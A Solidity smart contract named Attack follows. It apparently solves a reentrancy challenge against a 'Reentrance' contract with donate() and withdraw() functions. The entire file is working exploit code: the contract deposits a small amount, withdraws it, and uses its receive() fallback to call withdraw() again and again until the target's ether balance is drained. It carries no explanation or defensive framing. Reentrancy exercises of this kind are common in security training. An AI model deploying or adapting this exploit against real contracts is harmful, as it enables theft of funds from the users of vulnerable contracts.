```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface IReentrance {
    function donate(address _to) external  payable;
    function withdraw(uint256 _amount) external ;
}

contract Attack{
    IReentrance public reentrance;
    uint public _value = 200000000000000 wei; 

    constructor (address payable _reentrance) public  {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        require(msg.value >= _value);
        reentrance.donate{value: _value}(address(this));
        reentrance.withdraw(_value);
    } 

    receive() external payable {
        if (address(reentrance).balance >= _value) {
            reentrance.withdraw(_value);
        }
    }
}
```